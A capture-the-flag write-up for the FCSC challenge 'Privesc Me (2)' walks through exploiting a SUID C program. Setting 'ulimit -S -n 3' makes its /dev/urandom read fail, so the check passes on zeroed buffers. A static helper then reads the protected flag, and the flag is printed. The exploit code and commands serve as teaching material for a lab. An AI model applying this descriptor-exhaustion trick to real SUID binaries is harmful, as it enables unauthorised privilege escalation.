---
tags: [FCSC,0poss,op,misc]
title: Privesc Me (2) - "ALED" - Your randomness checker (misc - 194 pts)
---

# Privesc Me (2) - "ALED" - Your randomness checker (misc - 194 pts)

> Le dernier stagiaire de l'équipe nous a pondu un nouveau programme pour tester la robustesse des clés d'authentification que notre administrateur système utilise. Son outil est disponible dans le dossier stage1. Le chef a poussé un soupir d'agacement en voyant le code.

I found this one pretty fun and I think it was my favorite along with "It's mipsy router".

Once connected to the ssh, into the `stage1` folder, there are four files, `build.sh`, `flag.txt` (I wonder what that is), `stage1` (a SUID binary) and its source in `stage1.c`, here it is :
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#define BUF_SIZE 128

int main(int argc, char const *argv[]) {

    if(argc != 3){
        printf("Usage : %s <key file> <binary to execute>", argv[0]);
    }
    setresgid(getegid(), getegid(), getegid());

    int fd;
    unsigned char randomness[BUF_SIZE];
    unsigned char your_randomness[BUF_SIZE];
    memset(randomness, 0, BUF_SIZE);
    memset(your_randomness, 0, BUF_SIZE);

    int fd_key = open(argv[1], O_RDONLY, 0400);
    read(fd_key, your_randomness, BUF_SIZE);

    fd = open("/dev/urandom", O_RDONLY, 0400);
    int nb_bytes = read(fd, randomness, BUF_SIZE);
    for (int i = 0; i < nb_bytes; i++) {
        randomness[i] = (randomness[i] + 0x20) % 0x7F;
    }

    for(int i = 0; i < BUF_SIZE; i++){
        if(randomness[i] != your_randomness[i]) {
            puts("Meh, you failed");
            return EXIT_FAILURE;
        }
    }
    close(fd);
    puts("Ok, well done");
    char* arg[2] = {argv[2], NULL};
    execve(argv[2], arg, NULL);
    return 0;
}
```
It initializes two 128 bytes-long arrays with zeros and compares them. If they are the same, we get to execute any program we want... maybe `sh` ?

The `build.sh` file contains `gcc stage1.c -static -o stage1`. I guess the `-static` is here to prevent any `LD_PRELOAD`, that would be to easy. But this option gave me the idea for the exploit.

By googling things like "predict /dev/urandom ctf writeup" I found several [writeup](https://nickcano.com/pwnables-write-ups-oct17/)s on several similar challenges that were using `ulimit -f 0` in order to limit "the maximum size of files created by the shell" (- man). But the program here doesn't create any file to write the random content to it, but just reads from `/dev/urandom`. So we have to prevent it from reading from `urandom` to keep the `randomness` array filled with zeros. The `-n` option in the `ulimit` command allows to set a limit on the number of opened file descriptors.
I modified the original source on my system to make it print when the file openings fail and where the comparaison fails :
```c
int main(int argc, char const *argv[]) {

    if(argc != 3){
        printf("Usage : %s <key file> <binary to execute>", argv[0]);
    }
    setresgid(getegid(), getegid(), getegid());

    int fd;
    unsigned char randomness[BUF_SIZE];
    unsigned char your_randomness[BUF_SIZE];
    memset(randomness, 0, BUF_SIZE);
    memset(your_randomness, 0, BUF_SIZE);

    int fd_key = open(argv[1], O_RDONLY, 0400);
    read(fd_key, your_randomness, BUF_SIZE);
    if (-1 == fd_key)
	    puts("key open failed");

    fd = open("/dev/urandom", O_RDONLY, 0400);
    if (-1 == fd)
	    puts("/dev/urandom open failed");

    int nb_bytes = read(fd, randomness, BUF_SIZE);
    for (int i = 0; i < nb_bytes; i++) {
        randomness[i] = (randomness[i] + 0x20) % 0x7F;
    }

    printf("%128s\n", randomness);
    printf("%128s\n", your_randomness);
    for(int i = 0; i < BUF_SIZE; i++){
        if(randomness[i] != your_randomness[i]) {
	    printf("%#x : (%#x != %#x)", i, randomness[i], your_randomness[i]);
            puts("Meh, you failed");
            return EXIT_FAILURE;
        }
    }
    close(fd);
    puts("Ok, well done");
    char* arg[2] = {argv[2], NULL};
    execve(argv[2], arg, NULL);
    return 0;
}
```
Compile it with `gcc stage1.c -static -o stage1`.

By running `ulimit -n 3 ; ./stage1 osef /bin/sh` locally, we get :
```
bash: start_pipeline : pgrp pipe: Trop de fichiers ouverts
key open failed
/dev/urandom open failed                                                                                           
Ok, well done
/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24
```
It says "Ok, well done" (nice) but also `/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24`. Yeah obviously, `sh` is cannot load any dynlib since it already has 3 file descriptors open (stdin, stdout and stderr). So either we recompile `/bin/sh` statically, which I didn't do, or we just make another program, statically linked, to read the flag for us. Here it is :
```c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/resource.h>

int main() {
	struct rlimit lim = { 0 };
	if (0 != getrlimit(RLIMIT_NOFILE, &lim))
	{
		puts("Meh");
		return 1;
	}
	printf("Hard/soft limits : %ld/%ld\n", lim.rlim_cur, lim.rlim_max);

	lim.rlim_cur = lim.rlim_max;
	if (0 != setrlimit(RLIMIT_NOFILE, &lim))
	{
		puts("w00t");
		return 2;
	}

	if (0 != getrlimit(RLIMIT_NOFILE, &lim))
	{
		puts("Meh");
		return 3;
	}
	printf("Hard/soft limits : %ld/%ld\n", lim.rlim_cur, lim.rlim_max);

	char flag_buf[256] = { 0 };
	int fd = open("/home/challenger/stage1/flag.txt", O_RDONLY);
	if (-1 == fd)
	{
		puts("Phuck");
		return 4;
	}

	int red = read(fd, flag_buf, sizeof(flag_buf));
	printf("%d bytes read : %s\n", red, flag_buf);

	return 0;
}
```

It sets the soft limit of opened file descriptors to the maximum, that's why we need to use `-S` in the final exploit to set the soft limit instead of the default hard limit (which we can't increase afterwards).
I compile this remotly and...
```bash
$ ulimit -S -n 3 ; ./stage1 osef /tmp/yEyyy/exploit
-bash: start_pipeline: pgrp pipe: Too many open files
Ok, well done
Hard/soft limits : 3/1048576
Hard/soft limits : 1048576/1048576
70 bytes read : FCSC{6bd1152e8dcefc368b08a3e82241bc83ea7a613a3322c6a2d818d408e1fb4d60}
```

Yay.
